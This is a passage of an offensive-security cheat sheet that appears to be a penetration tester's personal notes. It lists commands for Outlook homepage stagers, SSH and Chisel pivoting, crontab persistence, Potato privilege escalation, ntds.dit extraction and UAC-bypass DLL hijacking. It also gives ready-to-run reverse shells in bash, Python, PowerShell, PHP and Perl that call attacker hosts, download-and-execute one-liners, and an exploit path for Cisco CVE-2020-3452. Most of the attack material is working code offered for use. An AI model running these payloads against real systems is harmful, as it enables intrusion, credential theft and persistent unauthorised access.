QUJ2QUdFQVpBQkdBR2tBYkFCbEFDZ0FJZ0JvQUhRQWRBQndBRG9BTHdBdkFERUFNQUF1QURFQU1BQXVBREVBTXdBdUFETUFOd0F2QUhNQWRBQmhBR2NBWlFCeUFEWUFOQUF1QUdRQWJBQnNBQ0lBTEFBaUFDUUFaUUJ1QUhZQU9nQjFBSE1BWlFCeUFIQUFjZ0J2QUdZQWFRQnNBR1VBWEFCdEFIVUFjd0JwQUdNQVhBQnpBSFFBWVFCbkFHVUFjZ0EyQURRQUxnQmtBR3dBYkFBaUFDa0FPd0FrQUdVQWVBQmxBR01BUFFCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWXdCMEFDQUFMUUJqQUc4QWJRQWdBSE1BYUFCbEFHd0FiQUF1QUdFQWNBQndBR3dBYVFCakFHRUFkQUJwQUc4QWJnQTdBQ1FBWlFCNEFHVUFZd0F1QUhNQWFBQmxBR3dBYkFCbEFIZ0FaUUJqQUhVQWRBQmxBQ2dBSWdCeUFIVUFiZ0JrQUd3QWJBQXpBRElBSWdBc0FDSUFKQUJsQUc0QWRnQTZBSFVBY3dCbEFISUFjQUJ5QUc4QVpnQnBBR3dBWlFCY0FHMEFkUUJ6QUdrQVl3QmNBSE1BZEFCaEFHY0FaUUJ5QURZQU5BQXVBR1FBYkFCc0FDSUFLUUFLQUE9PSIpCiBFbmQgU3ViCi0tPgoKPC9zY3JpcHQ+CjwvaGVhZD4KCjxib2R5PgogPG9iamVjdCBjbGFzc2lkPSJjbHNpZDowMDA2RjA2My0wMDAwLTAwMDAtQzAwMC0wMDAwMDAwMDAwNDYiIGlkPSJWaWV3Q3RsMSIgZGF0YT0iIiB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIj48L29iamVjdD4KPC9ib2R5Pgo8L2h0bWw+Cg==
```

Cleanup:

```
$ ./ruler -k --nocache --url https://autodiscover.megacorp.com/autodiscover/autodiscover.xml -d megacorp.com -u 'snovvcrash' -p 'Passw0rd!' -e snovvcrash@megacorp.com --verbose --debug homepage delete
```

Stager encryption is the same as for Ruler/Forms.




## Sharepoint

* [https://www.crummie5.club/the-lone-sharepoint/](https://www.crummie5.club/the-lone-sharepoint/)




## 1C

* [https://t.me/webpwn/280](https://t.me/webpwn/280)




## Cisco



### ASA Path Traversal

**CVE-2020-3452**

Check manually:

```
https://cisco.example.com/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
https://cisco.example.com/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../
```

Check with MSF:

```
msf > use auxiliary/scanner/http/cisco_directory_traversal
```





# Persistence




## Linux



### SSH Tunnel in Crontab

```bash
#!/bin/bash
if [[ `ps -ef | grep -c 2222` -eq 1 ]]; then
  /usr/bin/ssh -nNT -R 2222:localhost:22 -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i /home/alice/.ssh/.k nopty@10.10.13.37
fi
```

Attacker's box

```
$ sudo useradd -ms /bin/false nopty
$ sudo ssh-keygen -f /home/nopty/.ssh/dummy_key -t ed25519 -q -N ""
$ cat /home/nopty/.ssh/dummy_key.pub
$ sudo vi /home/nopty/.ssh/authorized_keys
from="10.10.13.38",command="echo 'Only port forwarding is allowed'",no-agent-forwarding,no-X11-forwarding,no-pty <DUMMY_KEY_PUB>
```

Victim's box:

```
$ curl 10.10.13.37/dummy_key > /home/alice/.ssh/.k
$ chmod 600 /home/alice/.ssh/.k
$ curl 10.10.13.37/callback.sh > /home/alice/.conf
$ chmod +x /home/alice/.conf
$ crontab -e
*/15 * * * * /home/alice/.conf
```





# Pivoting

* [PayloadsAllTheThings/Network Pivoting Techniques.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md)
* [https://www.programmersought.com/article/93593867459/](https://www.programmersought.com/article/93593867459/)




## SSH

* [https://habr.com/ru/post/331348/](https://habr.com/ru/post/331348/)



### Local vs Remote Port Forwarding

A cheatsheet for SSH Local/Remote Forwarding command syntax:

* `-L 1111:127.0.0.1:2222`: the traffic is forwarded *from SSH client via SSH server*, so `1111` is listening on *client-side* and traffic is sent to `2222` on *server-side*.
* `-R 2222:127.0.0.1:1111`: the traffic is forwarded *from SSH server via SSH client*, so `2222` is listening on *server-side* and traffic is sent to `1111` on *client-side*.

Consider the following example. An attacker has root privileges on Pivot1. He creates the first SSH tunnel (remote port forwarding) to interact with a vulnerable web server on Pivot2. Then he exploits the vulnerability on Pivot2 and triggers it to connect back to Attacker via a reverse-shell (firewall is active, so he needs to pivot through port 443, which is allowed). After that the attacker performs PE on Pivot2 and gets root. Then he creates another tunnel (local port forwarding) over the first one to SSH into Pivot2 from Attacker. Finally, he forwards port 80 over two existing hops to reach another vulnerable web server on Victim.

```
  Attacker (10.10.13.37)                                                    Pivot1 (10.1.1.1)                                  Pivot2 (10.2.2.2)                   Victim (10.3.3.3)
┌──────────────────────────────────────────────────────────────────────┐  ┌───────────────────────────────────────────────┐  ┌────────────────────────────────┐  ┌───────────────────┐
│                                                                   22 │  │                                               │  │                                │  │                   │
│ 1.  ssh -R 443:127.0.0.1:9001 root@10.1.1.1 ------------------------------► 10.1.1.1:22                                 │  │                                │  │                   │
│                                                                      │  │                                               │  │                                │  │                   │
│ 2.                                                                   │  │   Listens 0.0.0.0:443 ("GatewayPorts yes")    │  │                                │  │                   │
│                                                                      │  │                                               │  │                                │  │                   │
│ 3.                                                                   │  │   ~C ssh> -L 9002:10.2.2.2:80                 │  │                                │  │                   │
│                                                                      │  │                                               │  │                                │  │                   │
│ 4.  Listens 127.0.0.1:9002 (to interact with web server 10.2.2.2:80) │  │                                               │  │                                │  │                   │
│                                                                      │  │                                               │  │                                │  │                   │
│ 5.  shellpop -H 10.2.2.2 -P 443 --reverse --number 8 --base64        │  │                                               │  │                                │  │                   │
│                                                                      │  │                                               │  │                                │  │                   │
│                                                9001 over 10.1.1.1:22 │  │                                           443 │  │                                │  │                   │
│ 6.  rlwrap nc -lvnp 9001 ◄--- 127.0.0.1:9001 ◄----------------------------- 0.0.0.0:443 ◄───────────────────────────────┼──┼── Web server 10.2.2.2:80       │  │                   │
│                                                                      │  │                                               │  │                                │  │                   │
│ 7.  Got shell from 10.2.2.2                                          │  │                                               │  │                                │  │                   │
│                                                                      │  │                                               │  │                                │  │                   │
│ 8.  Got root on 10.2.2.2                                             │  │                                               │  │                                │  │                   │
│                                                                      │  │                                               │  │                                │  │                   │
│                                                                      │  │   ~C ssh> -L 9003:127.0.0.1:1337              │  │                                │  │                   │
│                                                                      │  │                                               │  │                                │  │                   │
│ 9.  Listens 127.0.0.1:9003                                           │  │                                               │  │                                │  │                   │
│                                                                      │  │                                               │  │                                │  │                   │
│                                                                      │  │                                            22 │  │                                │  │                   │
│                                                                      │  │   ssh -L 1337:127.0.0.1:22 root@10.2.2.2 ----------► 10.2.2.2:22                  │  │                   │
│                                                                      │  │                                               │  │                                │  │                   │
│                                                                      │  │   Listens 127.0.0.1:1337                      │  │                                │  │                   │
│                                                                      │  │                                               │  │                                │  │                   │
│                                                1337 over 10.1.1.1:22 │  │                           22 over 10.2.2.2:22 │  │                                │  │                   │
│ 10. ssh root@127.0.0.1 -p 9003 -------------------------------------------► 127.0.0.1:1337 ----------------------------------► 127.0.0.1:22                 │  │                   │
│                                                                      │  │                                               │  │                                │  │                   │
│                                                                      │  │                                               │  │   ~C ssh> -L 9004:10.3.3.3:80  │  │                   │
│                                                                      │  │                                               │  │                                │  │                   │
│ 11. Listens 127.0.0.1:9004                                           │  │                                               │  │                                │  │                   │
│                                                                      │  │                                               │  │                                │  │                   │
│                                                1337 over 10.1.1.1:22 │  │                           22 over 10.2.2.2:22 │  │                                │  │                   │
│ 12. curl http://127.0.0.1:9004/ ------------------------------------------► 127.0.0.1:1337 ----------------------------------► 127.0.0.1:22 ────────────────┼──┼─► 10.3.3.3:80     │
│                                                                      │  │                                               │  │                                │  │                   │
└──────────────────────────────────────────────────────────────────────┘  └───────────────────────────────────────────────┘  └────────────────────────────────┘  └───────────────────┘
```

Notes:

* `1` For SSH server to listen at `0.0.0.0` instead of `127.0.0.1`, the `GatewayPorts yes` must be set in `/etc/ssh/sshd_config`.
* `1` With SSH (or Chisel, for example) **server** running on the Attacker the same can be achieved by doing **local** port forwarding instead of **remote**.

```
snovvcrash@attacker:$ ./chisel server -p 8000
root@pivot1:# nohup ./chisel client 10.10.13.37:8000 443:127.0.0.1:9001 &
root@pivot1:# netstat -tulpan | grep 443
tcp6       0      0 :::443                 :::*                    LISTEN      18406/./chisel
snovvcrash@attacker:$ rlwrap nc -lvnp 9001
```



### Remote Dynamic Forwarding

* Attacker's IP: `10.10.13.37`
* Victims's IP: `10.10.13.38`

An example how to safely set remote dynamic port forwarding (SOCKS) with a builin SSH client.

Generate a dummy SSH key on Victim:

```
alice@victim:$ ssh-keygen -f dummy_key -t ed25519 -q -N ""
```

Add `dummy_key.pub` contents to `authorized_keys` on Attacker with the following options:

```
snovvcrash@victim:$ vi ~/.ssh/authorized_keys
from="10.10.13.38",command="echo 'Only port forwarding is allowed'",no-agent-forwarding,no-X11-forwarding,no-pty <DUMMY_KEY_PUB>
```

Connect to Attacker's SSH server from Victim:

```
alice@victim:$ ssh -fN -R 1080 -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -i dummy_key snovvcrash@10.10.13.37
```




## Chisel

1. [https://github.com/jpillora/chisel/releases](https://github.com/jpillora/chisel/releases)
2. [https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#chisel](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html#chisel)
3. [https://snovvcrash.github.io/2020/03/17/htb-reddish.html#chisel-socks](https://snovvcrash.github.io/2020/03/17/htb-reddish.html#chisel-socks)

* Attacker's IP: `10.10.13.37`
* Victims's IP: `10.10.13.38`

Reverse local port `1111` (on Victim) to local port `2222` (on Attacker):

```
$ wget [1/linux]
$ gunzip chisel*.gz && rm chisel*.gz && mv chisel* chisel && chmod +x chisel

$ wget [1/windows]
$ gunzip chisel*.exe.gz && rm chisel*.exe.gz && mv chisel*.exe chisel.exe && upx chisel.exe
$ md5sum chisel.exe

$ ./chisel server -p 8000 -v --reverse

PS > (new-object net.webclient).downloadfile("http://10.10.13.37/chisel.exe", "$env:userprofile\music\chisel.exe")
PS > get-filehash -alg md5 chisel.exe
PS > Start-Process -NoNewWindow -FilePath .\chisel.exe -ArgumentList "client 10.10.13.37:8000 R:127.0.0.1:2222:127.0.0.1:1111"
```

Socks5 proxy with Chisel in server mode:

```
alice@victim:$ ./chisel server -p 8000 --socks5 &
root@kali:$ ./chisel client 10.10.13.38:8000 socks
```

Socks5 proxy with Chisel in server mode when direct connection to server is not available (not relevant as Chisel supports socks5 in client mode now):

```
root@kali:$ ./chisel server -p 8000 --reverse
alice@victim:$ ./chisel client 10.10.13.37:8000 R:127.0.0.1:8001:127.0.0.1:8002 &
alice@victim:$ ./chisel server -v -p 8002 --socks5 &
root@kali:$ ./chisel client 127.0.0.1:8001 1080:socks
```

Socks5 proxy with Chisel in client mode:

```
root@kali:$ ./chisel server -p 8000 --reverse --socks5 [--auth snovvcrash:'Passw0rd!']
alice@victim:$ ./chisel client [--fingerprint <BASE64_STRING>] [--auth snovvcrash:'Passw0rd!'] 10.10.13.37:8000 R:socks
```




## revsocks

* [https://github.com/kost/revsocks](https://github.com/kost/revsocks)

```
root@kali:$ ./revsocks -listen :8000 -socks 127.0.0.1:1080 -pass 'Passw0rd!'
alice@victim:$ ./revsocks -connect 10.14.14.3:8000 -pass 'Passw0rd!'
```




## TCP over RDP

* [https://ijustwannared.team/2019/11/07/c2-over-rdp-virtual-channels/](https://ijustwannared.team/2019/11/07/c2-over-rdp-virtual-channels/)



### xfreerdp + rdp2tcp

* [https://github.com/V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
* [https://github.com/NotMedic/rdp-tunnel](https://github.com/NotMedic/rdp-tunnel)

```
$ xfreerdp /u:snovvcrash /p:'Passw0rd!' [/d:megacorp.local] /v:PC01.megacorp.local /dynamic-resolution /drive:www,/home/snovvcrash/www +clipboard /rdp2tcp:/home/snovvcrash/tools/rdp-tunnel/rdp2tcp
```

Reverse local port 9002 (on Victim) to local port 9001 on Attacker (good for reverse shells):

```
$ python rdp2tcp.py add reverse 127.0.0.1 9001 127.0.0.1 9002
```

Forward local port 9001 (on Attacker) to local port 9002 on Victim (good for bind shells):

```
$ python rdp2tcp.py add forward 127.0.0.1 9001 127.0.0.1 9002
```

Reverse tunnel web access via SOCKS proxy:

* [https://serverfault.com/a/361806/554483](https://serverfault.com/a/361806/554483)

```
$ python rdp2tcp.py add socks5 127.0.0.1 1080
$ python rdp2tcp.py add reverse 127.0.0.1 1080 127.0.0.1 9003
```

Other `xfreerdp` tips:

* Disable NLA with `-sec-nla` switch if user's password is expired.




## proxychains-ng

* [https://github.com/rofl0r/proxychains-ng](https://github.com/rofl0r/proxychains-ng)

Install:

```
$ git clone https://github.com/rofl0r/proxychains-ng ~/tools/proxychains-ng && cd ~/tools/proxychains-ng
$ ./configure --prefix=/usr --sysconfdir=/etc
$ make
$ sudo make install
$ sudo make install-config
+ edit /etc/proxychains.conf
```





# Privileges Abuse

* [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)




## SeImpersonatePrivilege

* [https://github.com/CCob/SweetPotato](https://github.com/CCob/SweetPotato)



### Potatoes

* [https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)


#### foxglovesec/RottenPotato

* [https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
* [https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)
* [https://github.com/foxglovesec/RottenPotato](https://github.com/foxglovesec/RottenPotato)

```
$ curl -L https://github.com/foxglovesec/RottenPotato/raw/master/rottenpotato.exe > r.exe
meterpreter > upload r.exe
meterpreter > load incognito
meterpreter > execute -cH -f r.exe
meterpreter > list_tokens -u
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
```


#### decoder/the-lonely-potato

* [https://decoder.cloud/2017/12/23/the-lonely-potato/](https://decoder.cloud/2017/12/23/the-lonely-potato/)


#### ohpe/juicy-potato

* [https://github.com/ohpe/juicy-potato/releases](https://github.com/ohpe/juicy-potato/releases)
* [https://github.com/ivanitlearning/Juicy-Potato-x86/releases](https://github.com/ivanitlearning/Juicy-Potato-x86/releases)
* [https://ohpe.it/juicy-potato/CLSID](https://ohpe.it/juicy-potato/CLSID)

```
$ curl -L https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe > j.exe
$ curl -L https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellTcpOneLine.ps1 > rev.ps1
...Change LHOST to 10.10.13.37 and LPORT to 443...
Cmd > certutil -urlcache -split -f http://10.10.13.37/j.exe C:\Windows\System32\spool\drivers\color\j.exe
Cmd > echo cmd /c powershell -exec bypass -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.13.37/rev.ps1')" > rev.bat
$ sudo rlwrap nc -lvnp 443
Cmd > .\j.exe -l 1337 -p C:\Windows\System32\spool\drivers\color\rev.bat -t * -c {8BC3F05E-D86B-11D0-A075-00C04FB68820}
```



### PrintSpoofer

* [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
* [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
* [https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-BadPotato.ps1](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-BadPotato.ps1)

```
PS > . .\Invoke-BadPotato.ps1; Invoke-BadPotato -C "C:\Users\snovvcrash\music\pwn.exe"
```



### Restore Privilege

* [https://itm4n.github.io/localservice-privileges/](https://itm4n.github.io/localservice-privileges/)




## SeBackupPrivilege



### SeBackupPrivilege

* [https://github.com/giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)

```
wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll

upload SeBackupPrivilegeCmdLets.dll
upload SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll
Copy-FileSeBackupPrivilege W:\Windows\NTDS\ntds.dit C:\Users\snovvcrash\Documents\ntds.dit -Overwrite
download ntds.dit
```



### robocopy

```
PS > cmd /c where robocopy
PS > robocopy /B W:\Windows\NTDS\ntds.dit C:\Users\snovvcrash\Documents\ntds.dit
```





# Python




## pip

Freeze dependencies:

```
$ pip freeze --local [-r requirements.txt] > requirements.txt
```




## Linting



### flake8

```
$ python3 -m flake8 --ignore=W191,E501,E722 somefile.py
```



### pylint

```
$ python3 -m pylint --disable=W0311,C0301,R0912,R0915,C0103,C0114,R0903 --msg-template='{msg_id}:{line:3d},{column:2d}:{obj}:{msg}' somefile.py
```




## PyPI



### twine

```
$ python setup.py sdist bdist_wheel [--bdist-dir ~/temp/bdistwheel]
$ twine check dist/*
$ twine upload --repository-url https://test.pypi.org/legacy/ dist/*
$ twine upload dist/*
```




## Misc



### Fix Python 2.7 Registry

```
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Python\PythonCore\2.7]

[HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Python\PythonCore\2.7\Help]

[HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Python\PythonCore\2.7\Help\MainPythonDocumentation]
@="C:\\Python27\\Doc\\python26.chm"

[HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Python\PythonCore\2.7\InstallPath]
@="C:\\Python27\\"

[HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Python\PythonCore\2.7\InstallPath\InstallGroup]
@="Python 2.7"

[HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Python\PythonCore\2.7\Modules]

[HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Python\PythonCore\2.7\PythonPath]
@="C:\\Python27\\Lib;C:\\Python27\\DLLs;C:\\Python27\\Lib\\lib-tk"
```





# RE





## Ghidra

Download through Tor:

* [https://ghidra-sre.org/](https://ghidra-sre.org/)

Install:

```
$ mv /opt/tor-browser/Browser/Downloads/ghidra*.zip ~/tools
$ cd ~/tools && unzip ghidra*.zip && rm ghidra*.zip && mv ghidra* ghidra && cd -
$ sudo apt install openjdk-11-jdk
```





# Reverse Shells

* [https://securixy.kz/hack-faq/reverse-shell-ili-bjekkonnekt.html/](https://securixy.kz/hack-faq/reverse-shell-ili-bjekkonnekt.html/)




## Bash

```bash
/bin/bash -c '/bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f
```




## Python



### IPv4

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()
```



### IPv6

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()
import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()
```




## PowerShell

System.Net.Sockets.TCPClient:

```
$client = New-Object System.Net.Sockets.TCPClient("10.10.13.37",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```




## PHP

```php
<?php echo passthru("/bin/bash -c '/bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"); ?>
```




## Perl

```
use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
```




## Netcat

```
$ {nc.tradentional|nc|ncat|netcat} <LHOST> <LPORT> {-e|-c} /bin/bash
```




## Meterpreter



### unicorn

* [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

```
$ ./unicorn.py windows/meterpreter/reverse_https 10.10.13.37 443
$ sudo msfconsole -qr unicorn.rc
PS > IEX(New-Object Net.WebClient).DownloadString('powershell_attack.txt')
```




## Listeners

```
$ {nc.tradentional|nc|ncat|netcat} [-6] -lvnp <LPORT>
```




## Upgrade to PTY

* [https://forum.hackthebox.eu/discussion/comment/22312#Comment_22312](https://forum.hackthebox.eu/discussion/comment/22312#Comment_22312)
* [https://xakep.ru/2019/07/16/mischief/#toc05.1](https://xakep.ru/2019/07/16/mischief/#toc05.1)
* [https://securixy.kz/hack-faq/apgrejd-reverse-shell-do-interaktivnogo-tty.html/](https://securixy.kz/hack-faq/apgrejd-reverse-shell-do-interaktivnogo-tty.html/)

```
$ python -c 'import pty; pty.spawn("/bin/bash")'
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
Or
$ script -q /dev/null sh

user@remote:$ ^Z
(background)

root@kali:$ stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'
(get ROWS and COLS)

root@kali:$ stty raw -echo; fg

(opt) user@remote:$ reset

user@remote:$ stty rows ${ROWS} cols ${COLS}

user@remote:$ export TERM=xterm
(or xterm-color or xterm-256color)

(opt) user@remote:$ exec /bin/bash [-l]
```




## Transport over DNS

* [https://xakep.ru/2018/09/07/dns-tunneling/](https://xakep.ru/2018/09/07/dns-tunneling/)



### chashell

* [https://github.com/sysdream/chashell](https://github.com/sysdream/chashell)

Buy and configure DNS (e. g., `c2cdomain.net`):

```
A * -> <IP>
A @ -> <IP>
A chashell -> <IP>
NS c -> chashell.c2cdomain.net
```

Get dependencies:

```
$ export GOPATH=/home/snovvcrash/code/go
$ export PATH=$GOPATH:$GOPATH/bin:$PATH
$ go get -v -u github.com/golang/dep/cmd/dep
$ go get github.com/mitchellh/gox
$ cd $GOPATH/src/github.com/golang/dep
$ go install ./...
```

Clone chashell into `$GOPATH/src` (otherwise, `dep` will error out):

```
$ git clone https://github.com/sysdream/chashell $GOPATH/src/chashell
$ cd $GOPATH/src/chashell
```

Build binaries:

```
$ export ENCRYPTION_KEY=$(python -c 'from os import urandom; print(urandom(32).encode("hex"))')
$ export DOMAIN_NAME=c.c2cdomain.net
$ make build-all OSARCH="linux/amd64"
```

Run server on Attacker:

```
$ cd release/
$ sudo systemctl stop systemd-resolved
$ sudo ./chaserv_linux_amd64
```

Run client on Victim:

```
$ ./chashell_linux_amd64
```




## Helpers



### pwncat

* [https://securixy.kz/hack-faq/pwncat-netcat-na-steroidah.html/](https://securixy.kz/hack-faq/pwncat-netcat-na-steroidah.html/)
* [https://github.com/cytopia/pwncat](https://github.com/cytopia/pwncat)



### VbRev

* [https://github.com/VbScrub/VbRev](https://github.com/VbScrub/VbRev)



### xc

* [https://github.com/xct/xc](https://github.com/xct/xc)

Listen:

```
$ rlwrap ./xc -l -p 443
```

Launch:

```
PS > Start-Process -NoNewWindow .\xc.exe "10.10.13.38 443"
```



### Payload Generators

* [http://www.jackson-t.ca/runtime-exec-payloads.html](http://www.jackson-t.ca/runtime-exec-payloads.html)
* [https://www.revshells.com/](https://www.revshells.com/)


#### ShellPop

* [https://github.com/0x00-0x00/ShellPop](https://github.com/0x00-0x00/ShellPop)

Bash reverse TCP:

```
$ shellpop -H 10.10.13.37 -P 9001 --reverse --number 8 --base64
```





# SMB

Check for SMB vulnerablities with Nmap:

```
$ sudo nmap -sV --script-args=unsafe=1 --script smb-os-discovery 10.10.13.37 -p139,445
$ sudo nmap -n -Pn -sV --script 'smb-vuln*' 10.10.13.37 -p445
```




## Fingerprint

* [https://book.hacktricks.xyz/pentesting/pentesting-smb#smb-server-version](https://book.hacktricks.xyz/pentesting/pentesting-smb#smb-server-version)

Get SMB version for ancient versions of Samba (for security reasons modern clients will not initiate connection with old protocols in use):

```
$ sudo ngrep -i -d eth0 's.?a.?m.?b.?a.*[[:digit:]]' port 139
$ echo exit | smbclient -N -L 10.10.13.37 --option='client min protocol=LANMAN1'
```




## Mounting

Mount:

```
$ sudo mount -t cifs '//127.0.0.1/Users' /mnt/smb -v -o user=snovvcrash,[pass='Passw0rd!']
```

Status:

```
$ mount -v | grep 'type cifs'
$ df -k -F cifs
```

Unmount:

```
$ sudo umount /mnt/smb
```




## smbclient

Null authentication:

```
$ smbclient -N -L 127.0.0.1
$ smbclient -N '\\127.0.0.1\Data'
```

With user creds:

```
$ smbclient -U snovvcrash '\\127.0.0.1\Users' 'Passw0rd!'
```

Get all files recursively:

```
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```




## smbmap

Null authentication:

```
$ smbmap -H 127.0.0.1 -u anonymous -R
$ smbmap -H 127.0.0.1 -u null -p "" -R
```





# SNMP




## onesixtyone

```
$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.13.37
```




## snmp-check

```
$ snmp-check -v 2c -c public 10.10.13.37
```





# SE




## Infra

* [https://github.com/n0pe-sled/Postfix-Server-Setup](https://github.com/n0pe-sled/Postfix-Server-Setup)




## Tools

* [https://github.com/decalage2/oletools](https://github.com/decalage2/oletools)
* [https://github.com/sevagas/macro_pack](https://github.com/sevagas/macro_pack)





# TFTP

Enum with Nmap:

```
$ sudo nmap -sVU -p69 --script tftp-enum 10.10.13.37
```

## Brute Force Filenames

Make a list of potential filenames. Use 8.3 notation:

```
PS > cmd /c dir /x
PS > cmd /c "for %I in (.) do @echo %~sI"
```

Download Python TFTP implementation and use the Bash script below:

* [https://github.com/m4tx/pyTFTP](https://github.com/m4tx/pyTFTP)

```
$ git clone https://github.com/m4tx/pyTFTP && cd pyTFTP
$ ./tftp-brute.sh 10.10.13.37 files.txt
```

```bash
 #!/usr/bin/env bash

IP=$1
FILES=$2

while IFS= read -r file; do
	echo -n "[*] Trying ${file}... "
	if ./client.py -g "${file}" "${IP}" > /dev/null 2>&1; then
		echo "SUCCESS"
	else
		echo "FAIL"
	fi
done < "${FILES}"
```





# UAC Bypass

* [https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC)




## SystemPropertiesAdvanced.exe



### srrstr.dll

```c
 #include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpReserved) {
	switch(dwReason) {
		case DLL_PROCESS_ATTACH:
			WinExec("C:\\Users\\<USERNAME>\\Documents\\nc.exe 10.10.14.16 1337 -e powershell", 0);
		case DLL_PROCESS_DETACH:
			break;
		case DLL_THREAD_ATTACH:
			break;
		case DLL_THREAD_DETACH:
			break;
	}

	return 0;
}
```

Compile on Kali:

```
$ i686-w64-mingw32-g++ main.c -lws2_32 -o srrstr.dll -shared
```



### DLL Hijacking

Upload `srrstr.dll` to `C:\Users\%USERNAME%\AppData\Local\Microsoft\WindowsApps\srrstr.dll` and check it:

```
PS > rundll32.exe srrstr.dll,xyz
```

Exec and get a shell ("requires an interactive window station"):

```
PS > cmd /c C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

* [https://egre55.github.io/system-properties-uac-bypass](https://egre55.github.io/system-properties-uac-bypass)
* [https://www.youtube.com/watch?v=krC5j1Ab44I&t=3570s](https://www.youtube.com/watch?v=krC5j1Ab44I&t=3570s)




## cmstp.exe

* [0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html](https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html)

```
PS > IEX(New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/snovvcrash/362be57caaa167e7f5667156ac80f445/raw/1990959bc80b56179863aede06695bc499249744/Bypass-UAC.ps1')
